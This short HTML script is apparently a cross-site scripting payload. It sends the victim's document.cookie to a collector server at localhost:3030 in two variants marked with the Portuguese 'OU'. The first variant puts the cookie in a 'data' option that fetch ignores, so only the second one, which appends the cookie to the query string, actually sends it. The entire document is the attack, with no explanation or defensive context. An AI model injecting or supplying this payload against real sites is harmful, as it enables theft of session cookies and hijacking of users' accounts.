<script>
    fetch("http://localhost:3030/",{
        method: "POST",
        mode: 'no-cors',
        data: document.cookie
    });

    // OU 
    fetch("http://localhost:3030/?=" + document.cookie,{
        method: "POST",
        mode: 'no-cors',
        data: "enviado"
    });
</script>